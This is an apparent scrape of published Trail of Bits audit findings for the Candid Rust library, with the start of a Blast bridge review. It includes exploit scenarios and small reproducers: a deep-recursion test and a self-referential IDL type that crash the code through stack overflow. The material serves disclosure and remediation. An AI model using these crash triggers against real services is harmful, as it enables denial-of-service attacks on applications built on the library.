Danger et al., JoCE 2013 16 noble-curves Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Unmaintained dependency in candid_parser ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid_parser package relies on serde_dhall , whose README contains the following message: STATUS I am no longer maintaining this project. I got it to support about 90% of the language but then lost faith in the usability of dhall for my purposes. I am willing to hand this over to someone who's excited about dhall and rust. Note that this nding is informational because candid_parser is outside of the audits scope. Exploit Scenario Eve learns of a vulnerability in serde_dhall . Because the package is unmaintained, the vulnerability persists. Eve exploits the vulnerability in candid , knowing that it relies on serde_dhall . Recommendations Short term, adopt one of the following three strategies:    Deprecate support for the dhall format. Seek an alternative implementation of serde_dhall s functionality. (We were unable to nd one.) Take ownership of serde_dhall . Taking one of these steps will eliminate candid_parser s current reliance on an unmaintained dependency. Long term, regularly run cargo-audit and cargo upgrade --incompatible . Doing so will help ensure that the project stays up to date with its dependencies. 2. Insu\u0000cient linter use Severity: Informational Diculty: High Type: Patching Finding ID: TOB-CANDID-2 Target: Various source les", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Imprecise errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid package has a catch all, Custom error variant that is overused. Using more precise error variants would make it easier for clients to know and act on errors that can occur in the candid package. The candid packages error type appears in gure 3.1. Note that it contains only two specic error variants, Binread and Subtype . Errors that do not fall into one of these two categories must be returned as a Custom error. 15 16 17 #[derive(Debug, Error)] pub enum Error { #[error( \"binary parser error: {}\" , .0.get(0).map(|f| format!( \"{} at byte offset {}\" , f.message, f.pos/2)).unwrap_or_else(|| \"io error\" .to_string()))] 18 19 20 21 22 23 24 25 } Binread( Vec <Label>), #[error( \"Subtyping error: {0}\" )] Subtype( String ), #[error(transparent)] Custom( #[from] anyhow::Error), Figure 3.1: The candid packages error type ( candid/rust/candid/src/error.rs#1525 ) Error has an associated msg function that wraps a string in an anyhow::Error , and returns it in a Custom error. Example uses of the msg function appear in gure 3.2. As the gure shows, IO errors and errors related to integer parsing are turned into Custom errors using the msg function. It would be better to give such errors their own variants, similar to Binread and Subtype . 119 120 121 122 123 } 124 125 impl From <io::Error> for Error { fn from (e: io ::Error) -> Error { Error::msg( format! ( \"io error: {e}\" )) } impl From <binread::Error> for Error { 126 127 128 129 } 130 131 132 133 134 135 } fn from (e: binread ::Error) -> Error { Error::Binread(get_binread_labels(&e)) } impl From <ParseIntError> for Error { fn from (e: ParseIntError ) -> Error { Error::msg( format! ( \"ParseIntError: {e}\" )) } Figure 3.2: Example uses of Error::msg ( candid/rust/candid/src/error.rs#119135 ) Exploit Scenario Alice writes code that uses candid as a dependency. A catastrophic error occurs in candid . The error is bubbled up to Alices code as a Custom error. Alices code ignores the error, not knowing that it is one of the possible Custom errors. Recommendations Short term, use catch all error types (like Custom ) sparingly. Prefer to use variants that communicate the type of the error that occurred. For example, the uses of Error::msg in gure 3.2 could be given their own error variants, analogous to Error::Binread in the same gure. Taking these steps will make it easier for clients to know the types of errors that can occur, and to act on them. Long term, review all uses of with_context . This method adds information to an error, but as a string (i.e., unstructured data). It may be preferable to present such data to clients in struct elds.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Unnecessary recursion ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid package contains a recursive function, TypeEnv::rec_find_type (gure 4.1), that could be rewritten to use iteration. Using recursion unnecessarily makes a program vulnerable to a stack overow. 44 45 46 47 48 49 50 } pub fn rec_find_type (& self , name: &str ) -> Result <&Type> { let t = self .find_type(name)?; match t.as_ref() { TypeInner::Var(id) => self .rec_find_type(id), _ => Ok (t), } Figure 4.1: Denition of TypeEnv::rec_find_type ( candid/rust/candid/src/types/type_env.rs#4450 ) Also note that the function does not protect against innite loops/recursion. The function could do so by, for example, storing the hash of each name processed in a set, and consulting the set before iterating/recursing. We observed stack overows in TypeEnv::rec_find_type while fuzzing. However, we have not yet determined whether those stack overows would be prevented by checks performed in TypeEnv::rec_find_type s callers. Exploit Scenario Alice writes a program that uses the candid library. Eve discovers a bug that allows her to map a candid type variable to itself. Eve triggers the bug in Alices program, causing it to overow its stack and crash. Recommendations Short term, take the following steps:   Rewrite TypeEnv::rec_find_type to use iteration instead of recursion. Add protection from innite loops by, for example, storing the hash of each name processed in a set. Taking these steps will help protect candid clients against denial-of-service attacks. Long term, fuzz the candid packages functions regularly. This issue was found through fuzzing. Fuzzing regularly could help to expose similar issues.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: N/A"]}, {"title": "5. The IDL allows for recursive cyclic types which should not be allowed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "While the Candid specication states that type cycles must be productive (gure 5.1), it is possible to create a record type with a cyclic reference to itself, thus making it a non-productive type. An example of a self-referential type is shown in gure 5.2. Additionally, if one uses the didc tool to generate a random value of such a type, the tool crashes due to a stack overow (as shown in gure 5.3), since it tries to create an innitely long cycle of references. Type definitions are mutually recursive, i.e., they can refer to themselves or each other. However, every type cycle must be productive, i.e., go through a type expression that is not just an identifier. A type definition that is vacuous, i.e., is only equal to itself, is not allowed. Figure 5.1: Excerpt from the Candid IDL specication type A = record { a : A }; service : { test : (A) -> (int32) query } Figure 5.2: An example IDL le that denes a non-productive recursive type cycle $ ./target/debug/didc random -d ./example.did -t '(A)' thread 'main' has overflowed its stack fatal runtime error: stack overflow [1] 34219 abort ./target/debug/didc random -d ./example.did -t '(A)' Figure 5.3: Crash of the didc tool when we try to randomize a value of the A type dened in gure 5.2 Recommendations Short term, change the Candid implementation so that it disallows the creation of record types with non-optional cycles to themselves (also consider longer cycles like A->B->C->A). The compiler could suggest that the cycle be xed by specifying an optional reference, since it would be possible to create instances of such types. For example, the type from gure 5.2 could be xed as: type A = record { a : opt A }; .", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: N/A"]}, {"title": "6. Stack overow in encoding/serialization path ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "Encoding a long record cycle causes recursive calls that lead to a stack overow, which causes the Encode! function to crash. This may lead to denial of service for programs that serialize user data using Candid into types that contain cycles. Figure 6.1 shows example test code that triggers this case. Also note that Candid performs stack exhaustion checks via the check_recursion! macro , but while it is used in the Decode! functionality, it is missing from the Encode! path. #[test] fn test_recursive_type_encoding () { #[derive(Debug, CandidType, Deserialize)] struct A { a: Box < Option <A>>, } let mut data = A { a: Box ::new( None ) }; for _ in 0 .. 5000 { data = A { a: Box ::new( Some (data)) }; } Encode!(&data).unwrap(); } Figure 6.1: Test that causes the Encode! function to crash due to a stack overow Running this test under a debug mode results in the following stack trace, shown in gure 6.2. Figure 6.2: Screenshot from RustRover IDE when the stack overow crash happens in the test from gure 6.1. Test run on MacOS. Exploit Scenario A web service uses Candid to serialize data sent as JSON into a record type with cyclic reference. An attacker leverages this fact and sends a JSON with a big linked structure causing the web service to crash. Recommendations Short term, x the stack overow crash in the Encode! functionality. This can be done either by adding the check_recursion! checks to the encoding code paths, or by changing the encoding algorithm to use loops instead of recursion (although this would not be trivial). Long term, add the test from gure 6.1 to the Candid types tests and change it so it expects that the Encode! call errors out with a Recursion limit exceeded at depth X error (in case the code is xed by adding the recursion checks mentioned in the short-term recommendation).", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. The fuzzing harnesses do not build ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The fuzzing harnesses available in the candid/rust/candid/fuzz directory are not building in the audited codebase. One of the reasons for this is that the candid-fuzz crate refers to a non-existent feature called parser of the candid crate (gure 7.1). features = [ \"parser\" ] Figure 7.1: candid-fuzz s reference to the non-existent candid parser feature ( candid/rust/candid/fuzz/Cargo.toml#18 ) Recommendations Short term, x the fuzzing harnesses so they build properly. Long term, run the fuzzing harnesses regularly, at least before each new release of the Candid project.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "8. The oat32/oat64 innite signs are displayed incorrectly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The Candid's fmt::Debug trait implementation for its IDLValue type displays the +inf and -inf values of its oat types ( float32 and float64 ) by appending a .0 to them, which seems unexpected and incorrect. This can be conrmed with the test from gure 8.1. #[test] fn test_floats_inf () { let f: f32 = \"inf\" .parse().unwrap(); // Note: A valid test after the bug is fixed should not include the \".0\" part assert_eq! ( format! ( \"{:?}\" , IDLValue::Float32(f)), \"inf.0 : float32\" ); let f: f32 = \"-inf\" .parse().unwrap(); // Note: A valid test after the bug is fixed should not include the \".0\" part assert_eq! ( format! ( \"{:?}\" , IDLValue::Float32(f)), \"-inf.0 : float32\" ); } Figure 8.1: An example test that shows how +inf and -inf oats are displayed This issue is caused by the f.trunc() path in the number_to_string function (gure 8.2). pub fn number_to_string (v: & IDLValue ) -> String { match v { ... Float32(f) => { if f.trunc() == *f { format! ( \"{f}.0\" ) } else { f.to_string() } } Float64(f) => { if f.trunc() == *f { format! ( \"{f}.0\" ) } else { f.to_string() } Figure 8.2: The number_to_string function ( candid/rust/candid/src/pretty/candid.rs#L297L310 ) Additionally, the didc tool cannot encode special oat values ( +inf , -inf , and NaN ), neither with the .0 sux nor without it, as shown in gure 8.3. $ ./target/debug/didc encode -t '(float32)' '(inf : float32)' error: parser error  candid arguments:1:2  1  (inf : float32)  ^^^ Unexpected token  = Expects one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", \"service\", \"sign\", \"text\", \"variant\", \"vec\" error: invalid value '(inf : float32)' for '[ARGS]': Candid parser error: Unrecognized token `Id(\"inf\")` found at 1:4 Expected one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", \"service\", \"sign\", \"text\", \"variant\" or \"vec\" For more information, try '--help'. $ ./target/debug/didc encode -t '(float32)' '(inf.0 : float32)' error: parser error  candid arguments:1:2  1  (inf.0 : float32)  ^^^ Unexpected token  = Expects one of \"(\", \")\", \"blob\", \"bool\", \"decimal\", \"float\", \"func\", \"hex\", \"null\", \"opt\", \"principal\", \"record\", \"service\", \"sign\", \"text\", \"variant\", \"vec\" Figure 8.3: The didc tool cannot encode special oat values. Recommendations Short term, x the display of the -inf and +inf float32 and float64 values so that they do not include the \".0\" sux. Also, consider supporting those values as well as the NaN value in the didc encode tool. Long term, extend the test suite to test for the cases described in this nding.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "9. Incorrect arithmetic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "Certain arithmetic operators (minus, divide, modulo) for the Nat and Int types when the rst argument of the operator is a built-in type are awed. The operators produce values as though the operators' arguments are passed in an inverted order. This issue can be seen in existing tests that check for the incorrect results for those operators (gure 9.1). let x: $t = 1 ; let value = < $res >::from(x + 1 ); /* ... */ assert_eq! (x + value.clone(), 3 ); assert_eq! (x - value.clone(), 1 ); assert_eq! (x * value.clone(), 2 ); assert_eq! (x / value.clone(), 2 ); assert_eq! (x % value.clone(), 0 ); // 1-2 == 1 // 1/2 == 2 // 1%2 == 0 Figure 9.1: Existing (passing) test case checking arithmetic of Nat / Int with awed expected values ( candid/rust/candid/tests/number.rs#L98L116 ) Exploit Scenario A developer writes code that uses the awed arithmetic in a nancial operation, assuming it works correctly. An attacker nds that fact and exploits it to gain some funds. Recommendations Short term, x the implementation of arithmetic operators and the relevant test assertions. Long term, review test cases and expected values to mitigate human error. Where possible, attempt to automate tests so they do not rely on human-provided values.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "10. Inadequate recursion checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The de module uses a check_recursion macro (gure 10.1) to avoid overowing the stack when deserializing. However, the macro is not used outside of the de module, so stack overows can still occur. 202 203 204 205 206 macro_rules! check_recursion { ( $this : ident $($body : tt )*) => { $this .recursion_depth += 1 ; match stacker::remaining_stack() { Some (size) if size < 32768 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}\" , $this .recursion_depth))), 207 None if $this .recursion_depth > 512 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}. Cannot detect stack size, use a conservative bound\" , $this .recursion_depth))), 208 209 210 211 212 213 214 } }; _ => (), } let __ret = { $this $($body )* }; $this .recursion_depth -= 1 ; __ret Figure 10.1: Denition of the check_recursion macro ( candid/rust/candid/src/de.rs#202214 ) The issue is that function stack frame sizes dier. Thus, a function with a small stack frame could recurse N times and not overow the stack. However, the use of that function could be followed by a call to a function with a larger stack frame that, when recursing a similar number of times, does overow the stack. If the check_recursion macro is used only in the former function and not in the latter, a panic will result instead of an error. For example, IDLArgs  Debug implementation (gure 10.2) is recursive. However, it does not use the check_recursion macro. Moreover, experiments suggest it has a larger stack frame size than candid s deserialization functions. Thus, a program could deserialize an IDLArgs value and try to print its Debug representation, resulting in a panic. 250 251 252 253 254 255 256 257 258 259 260 261 262 } impl fmt::Debug for IDLArgs { fn fmt (& self , f: & mut fmt::Formatter<' _ >) -> fmt :: Result { if self .args.len() == 1 { write! (f, \"({:?})\" , self .args[ 0 ]) } else { let mut tup = f.debug_tuple( \"\" ); for arg in self .args.iter() { tup.field(arg); } tup.finish() } } Figure 10.2: Recursive function not involved in deserialization ( candid/rust/candid/src/pretty/candid.rs#250262 ) Appendix E gives an example test showing that the just described scenario is achievable. Exploit Scenario Alice writes a program that uses the candid library. Alices program deserializes values from untrusted sources and prints their Debug representations when an error occurs. Eve uses the technique described above to crash Alices program. Recommendations Short term, adapt IDLArgs  Debug and Display implementations to use the check_recursion macro. Similarly adapt other functions that are known to be recursive and that act on deserialized data. Doing so will eliminate potential denial-of-service vectors. Long term, take the following steps:   Fuzz the candid packages functions regularly. This issue was found by running one of the existing fuzzing harnesses. Fuzzing regularly could help to expose similar issues. Avoid recursion except where specically necessary. Recursion can lead to stack overows and can introduce denial-of-service vectors. (See also TOB-CANDID-4 .)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. TypeId::of functions could be optimized into a single function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid library uses the address of a function to identify a type. However, there is no guarantee that the compiler will not optimize those functions into a single function. Hence, the technique could stop working at any time. The relevant code appears in gure 11.1. The general technique appears to have been introduced in rust-lang/rust issue #41875 . However, several problems with the technique are pointed out in that issue, including the one in this ndings title . impl TypeId { pub fn of <T: ? Sized >() -> Self { let name = std::any::type_name::<T>(); TypeId { id: TypeId ::of::<T> as usize , name, } } 15 16 17 18 19 20 21 22 23 } Figure 11.1: TypeId implementation ( candid/rust/candid/src/types/internal.rs#1523 ) Note that the TypeId in gure 11.1 includes a name eld, which the original proposal did not. The inclusion of the name eld provides some protection against optimization. However, the compiler could, in principle, optimize out that eld if it is unread. Even if the eld is read, type names are meant only for diagnostic purposes , and there is no guarantee that they dier across types. Thus, the compiler could collapse TypeId::of for two types meant to be distinct. Exploit Scenario Alice writes a program that uses the candid library. A future version of the compiler collapses the TypeId::of functions for certain types that Alices program uses. Alices program no longer deserializes values correctly. Recommendations Short term, take the following steps:   Conspicuously document that the candid library relies on an unsound TypeId implementation. Doing so will alert users of the possibility that the library may behave incorrectly on certain types. Develop thorough unit, property, and possibly fuzzing tests to check for distinct types whose TypeId::of functions are not distinguished by the compiler. Doing so could help alert you to types on which the candid library may behave incorrectly. Long term, keep abreast of proposals to develop a non-static TypeId . If such a proposal is adopted, consider switching to it. Doing so could provide a solution that would not be undermined by the compiler. References   rust-lang/rust issue #41875: Tracking issue for non_static_type_id Pre-RFC: non-footgun non-static TypeId", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Deserialization correctness depends on the thread in which operations are performed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid library uses a thread local ENV map to record the types that knot IDs map to. Because the map is thread local, it could fail to be populated in a thread that performs deserialization, causing deserialization of a knot to fail. ENV s declaration appears in gure 12.1. There is no public function to populate ENV outright. Rather, ENV is populated as a side eect of calling the trait method CandidType::ty (gures 12.2 and 12.3). 629 630 thread_local! { static ENV : RefCell <HashMap<TypeId, Type>> = RefCell::new(HashMap::new()); Figure 12.1: Declaration of ENV ( candid/rust/candid/src/types/internal.rs#629630 ) 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 } fn ty () -> Type { let id = Self ::id(); if let Some (t) = self ::internal::find_type(&id) { match *t { TypeInner::Unknown => TypeInner::Knot(id).into(), _ => t, } } else { self ::internal::env_add(id.clone(), TypeInner::Unknown.into()); let t = Self ::_ty(); self ::internal::env_add(id.clone(), t.clone()); self ::internal::env_id(id, t.clone()); t } Figure 12.2: Trait method CandidType::ty ( candid/rust/candid/src/types/mod.rs#3448 ) 646 647 648 } pub ( crate ) fn env_add (id: TypeId , t: Type ) { ENV.with(|e| drop (e.borrow_mut().insert(id, t))); Figure 12.3: Function env_add , which is called by CandidType::ty ( candid/rust/candid/src/types/internal.rs#646648 ) A thread can construct a type that implements CandidType without calling CandidType::ty . If that thread then tries to deserialize that type, the deserialization could fail. Appendix F gives an example demonstrating the problem. Note: We were able to trigger the bug using IDLDeserialize::get_value_with_type , but not otherwise. That method is guarded by the value feature ag, and thus was out of scope of the audit. For that reason, we have given the nding informational severity. If there was a way to trigger the bug without requiring optional features, the ndings severity would be high. Exploit Scenario Alice writes a program that uses the candid library. Alices program uses multiple threads and deserializes values from untrusted sources. Eve discovers a code path that requires Alices program to perform deserialization without calling CandidType::ty . Eve uses the code path to crash Alices program. Recommendations Short term, conspicuously document that the candid library is not thread safe. Moreover, users should not rely on data passed between threads, even when Rusts type system allows it. Doing so will reduce the risk of users misusing candid s API. Long term, eliminate the implicit requirement that CandidType::ty be called for deserialization to work correctly. Adopt an API that makes the population of ENV more explicit. For example, rather than have ENV be a thread local variable, consider storing it inside of a context object. When serializing or deserializing, a user could be required to pass such a context object. By making users responsible for managing such context objects and their respective ENV elds, users are less likely to be surprised by failures at inopportune times.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "13. External GitHub CI actions versions are not pinned ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The GitHub Actions pipelines used in candid and ic-transport-types ( agent-rs repository) use several third-party actions versions that are not pinned to a commit but to a branch or a release tag that can be changed. These actions are part of the supply chain for CI/CD and can execute arbitrary code in the CI/CD pipelines. A security incident in any of the above GitHub accounts or organizations can lead to a compromise of the CI/CD pipelines and any artifacts they produce or any secrets they use. The following actions are owned by GitHub organizations that might not be aliated directly with the API/software they are managing:               EmbarkStudios/cargo-deny-action@v1 South-Paw/action-netlify-deploy@v1.0.4 [archived] actions-rs/cargo@v1 [archived] actions-rs/toolchain@v1 [archived] actions/cache@v2 actions/checkout@master , v1 , v2 , v3 actions/download-artifact@v3 actions/setup-node@v3 actions/upload-artifact@v3 boa-dev/criterion-compare-action@master cachix/install-nix-action@v12 unsplash/comment-on-pr@v1.2.0 ructions/cargo@v1 svenstaro/upload-release-action@v2 Note that we included GitHub actions from the actions organization owned by GitHub even though Dnity already implicitly trusts GitHub by virtue of using their platform. However, if any of their repositories gets hacked, it may impact the Dnitys CI builds. Exploit Scenario A private GitHub account with write permissions for one of the untrusted GitHub actions is taken over by social engineering. For example, a user uses an already-leaked password and is convinced to send a 2FA code to the attacker. The attacker updates the GitHub actions and puts a backdoor in the release artifacts produced by those actions. Recommendations Short term, pin all external and third-party actions to a Git commit hash. Avoid pinning to a Git tag as these can be changed after creation. We also recommend using the pin-github-action tool to manage pinned actions. GitHub dependabot is capable of updating GitHub Actions that use commit hashes. Long term, audit all pinned actions or replace them with a custom implementation. Also, consider updating archived GitHub actions to active ones.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "14. Inconsistent support for types in operators ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "Only a subset of expected functions are implemented for the combination of Nat and i32 types. As a result, the operators work only if Nat is exactly at the left side of the operator. As a result, certain code that could be assumed to compile, does not compile. This is demonstrated in gures 14.12, where the test_i32_Nat test function does not compile. // This test compiles: #[test] fn test_Nat_i32 () { let l : Nat = <Nat>::from( 1 ); let r : i32 = 1 ; let _ = l + r; } // This test fails to compile: #[test] fn test_i32_Nat () { let l : i32 = 1 ; let r : Nat = <Nat>::from( 1 ); let _ = l + r; } Figure 14.1: Two functions calculating sum of two variables of types i32 and Nat in two dierent orders error[E0277]: cannot add `candid::Nat` to ` i32 ` --> rust /candid/tests/playground.rs: 74 : 15 | | | let _ = l + r; ^ no implementation for ` i32 + candid::Nat` Figure 14.2: Compilation error from the code from gure 14.1 When an operator exists for two types, it is expected to work both ways; therefore, both tests are expected to pass. The plus operator shown in gure 14.1 is only an example, and the described issue occurs with other operators as well. Recommendations Short term, implement all operators for Nat and i32 . Consider implementing them for other integer types, as support for only i32 is inconsistent. Long term, write methodically comprehensive tests for every function. Cover all edge cases and potential errors", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "15. Recursion checks do not ensure stack frame size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid package implements the check_recursion macro, which checks for recursion depth and whether the remaining stack size is lower than 32768 bytes. However, there is no guarantee that the stack frame of a function that will be called within the scope of the check_recursion macro will not be bigger than 32768 bytes. If this happens, the check would fail to t its purpose. The severity of this nding is informational because it is unlikely that a stack frame would exceed 32768 bytes. However, we still ag it since this is neither guaranteed nor checked by the code. #[cfg(not(target_arch = \"wasm32\" ))] macro_rules! check_recursion { ( $this : ident $($body : tt )*) => { $this .recursion_depth += 1 ; match stacker::remaining_stack() { Some (size) if size < 32768 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}\" , $this .recursion_depth))), None if $this .recursion_depth > 512 => return Err (Error::msg( format! ( \"Recursion limit exceeded at depth {}. Cannot detect stack size, use a conservative bound\" , $this .recursion_depth))), _ => (), } let __ret = { $this $($body )* }; $this .recursion_depth -= 1 ; __ret }; } Figure 15.1: candid/rust/candid/src/de.rs#L201L214 Recommendations Long term, nd a way to check the stack frame sizes of functions called within the check_recursion macro and ensure that the stack frame size is never greater than what check_recursion checks for. There exists a LLVM ag, emit-stack-sizes , that may help achieve this, although it is unstable. Additionally, document any meaningful information around stack frame sizes so that future readers of the check_recursion macro have more information about its assurances.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Unmaintained dependency in candid_parser ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The candid_parser package relies on serde_dhall , whose README contains the following message: STATUS I am no longer maintaining this project. I got it to support about 90% of the language but then lost faith in the usability of dhall for my purposes. I am willing to hand this over to someone who's excited about dhall and rust. Note that this nding is informational because candid_parser is outside of the audits scope. Exploit Scenario Eve learns of a vulnerability in serde_dhall . Because the package is unmaintained, the vulnerability persists. Eve exploits the vulnerability in candid , knowing that it relies on serde_dhall . Recommendations Short term, adopt one of the following three strategies:    Deprecate support for the dhall format. Seek an alternative implementation of serde_dhall s functionality. (We were unable to nd one.) Take ownership of serde_dhall . Taking one of these steps will eliminate candid_parser s current reliance on an unmaintained dependency. Long term, regularly run cargo-audit and cargo upgrade --incompatible . Doing so will help ensure that the project stays up to date with its dependencies.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Insu\u0000cient linter use ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The Candid project appears to run Clippy with only the default set of lints enabled ( clippy::all ). The maintainers should consider running additional lints, as many of them produce warnings when enabled for the project. Running Clippy with -W clippy::pedantic produces several hundred warnings, indicating that enabling additional lints could have a positive impact on the correctness of the codebase. Examples of such warnings appear in gures 2.1 through 2.3. warning: unnested or-patterns --> rust/candid/src/de.rs:721:13 | 721 | (TypeInner::Null, TypeInner::Opt(_)) | (TypeInner::Reserved, TypeInner::Opt(_)) => { | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#unnested_or_patterns = note: `-W clippy::unnested-or-patterns` implied by `-W clippy::pedantic` help: nest the patterns | 721 | (TypeInner::Null | TypeInner::Reserved, TypeInner::Opt(_)) => { | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Figure 2.1: Warning produced by the clippy::unnested_or_patterns lint warning: calling `to_string` on `&&str` --> rust/candid/src/error.rs:53:26 | 53 | message: err.to_string(), | ^^^^^^^^^^^^^^^ help: try dereferencing the receiver: `(*err).to_string()` | = help: `&str` implements `ToString` through a slower blanket impl, but `str` has a fast specialization of `ToString` = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#inefficient_to_string = note: `-W clippy::inefficient-to-string` implied by `-W clippy::pedantic` Figure 2.2: Warning produced by the clippy::inefficient_to_string lint warning: it is more concise to loop over references to containers instead of using explicit iteration methods --> rust/candid/src/types/impls.rs:137:18 | 137 | for e in self.iter() { | ^^^^^^^^^^^ help: to write this more concisely, try: `self` | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#explicit_iter_loop = note: `-W clippy::explicit-iter-loop` implied by `-W clippy::pedantic` Figure 2.3: Warning produced by the clippy::explicit_iter_loop lint Exploit Scenario Eve uncovers a bug in the candid package. The bug would have been caught by Dnity had additional lints been enabled. Recommendations Short term, review all of the warnings currently generated by Clippys pedantic lints. Address those in gures 2.1 through 2.3, and any others for which it makes sense to do so. Taking these steps will produce cleaner code, which in turn will reduce the likelihood that the code contains bugs. Long term, take the following steps:   Consider running Clippy with -W clippy::pedantic regularly. As demonstrated by the warnings in gures 2.1 through 2.3, the pedantic lints provide valuable suggestions. Regularly review Clippy lints that have been allowed to determine whether they should still be given such an exemption. Allowing a Clippy lint unnecessarily could cause bugs to be missed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "16. Misleading error message ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-dfinity-candid-securityreview.pdf", "body": "The length of a vector is checked to be exactly 32, but whenever it is not, a length parity error message is displayed. The message does not describe the error. Additionally, value 32 is a magic number and should be replaced with a named constant. let vec = hex::decode(from).map_err(RequestIdFromStringError::FromHexError)?; if vec.len() != 32 { return Err (RequestIdFromStringError::InvalidSize(vec.len())); } Figure 16.1: Vector length tested to be exactly 32 in from_str function and returning RequestIdFromStringError::InvalidSize with misleading message (see gure 16.2) whenever the length is not 32 ( ic-transport-types/src/request_id.rs#L85L87 ) /// The string was not of a valid length. #[error( \"Invalid string size: {0}. Must be even.\" )] InvalidSize( usize ), Figure 16.2: Error message informing about incorrect string size with additional, unnecessary comment about numbers parity ( ic-transport-types/src/request_id/error.rs#L8L10 ) Recommendations Short term, update the error message to accurately describe the issue and replace the value 32 with a named constant. Long term, use error names that describe errors in detail; if length parity is a concern, add it to the error name instead of using more general naming like InvalidSize . Also, make sure that error messages do not contain any misleading text. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. isStakingEnabled returns true when Lido is paused ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf", "body": "The isStakingEnabled function returns true when Lido has paused staking on its system. Instead, it should return false (gure 1.1). /// @inheritdoc YieldProvider function isStakingEnabled ( address token ) public view override returns ( bool ) { return token == address (LIDO) && LIDO.isStakingPaused(); } Figure 1.1: The isStakingEnabled function incorrectly returns the status of whether Lido has paused staking. ( optimism/packages/contracts-bedrock/src/mainnet-bridge/yield-providers/L idoYieldProvider.sol#L53-L56 ) The function should negate the return value of LIDO.isStakingPaused . Recommendations Short term, update the isStakingEnabled function, as shown in gure 1.2: /// @inheritdoc YieldProvider function isStakingEnabled ( address token ) public view override returns ( bool ) { return token == address (LIDO) && !LIDO.isStakingPaused(); } Figure 1.2: This corrected version of the isStakingEnabled function correctly assesses whether Lido is paused. Long term, improve the unit test coverage to validate all getter functions and their expected functionality.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "2. ETH yield token user deposits lose replay capabilities on the L2 bridge ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-metalayerblast-securityreview.pdf", "body": "ETH yield token deposits on the Blast bridge do not use the L1CrossDomainMessenger component to relay the message to L2. As a result, the default transaction replay capabilities provided by the messenger are not available to users. On Optimism, the traditional ow for token deposits is for the L1 bridge to call the L1CrossDomainMessenger.sendMessage function. Internally, the messenger will invoke the OptimismPortal.depositTransaction function, where the calldata for the L2 side is for the L2CrossDomainMessenger.relayMessage function (gure 2.1). The relayMessage function provides transaction replay capabilities if the original transaction fails to execute successfully. These capabilities ensure that users funds do not become locked in the 